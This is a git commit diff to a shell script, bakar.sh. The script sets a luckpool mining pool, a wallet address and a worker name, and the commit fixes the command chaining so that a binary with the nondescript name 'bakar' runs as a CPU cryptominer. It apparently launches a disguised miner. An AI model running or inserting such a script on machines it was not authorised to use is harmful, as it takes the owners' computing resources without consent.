391921f551e090318484f105752799fd23779758
verseaja <84141277+verseaja@users.noreply.github.com>
2021-05-13 08:51:16 -0700

    Update bakar.sh

--- bakar.sh
+++ bakar.sh
@@ -3,5 +3,5 @@ POOL=stratum+tcp://na.luckpool.net:3956#xnsub
 WALLET=RW4ftUpRtvNW4XHpqJYTfkeFBRFvgeCYVh
 WORKER=hell01
 
-chmod +x ./bakar && chmod +x ./bakar1 ./bakar -c $POOL -u $WALLET.$WORKER -p x --cpu 6
+chmod +x ./bakar && chmod +x ./bakar1 && ./bakar -c $POOL -u $WALLET.$WORKER -p x --cpu 6
 
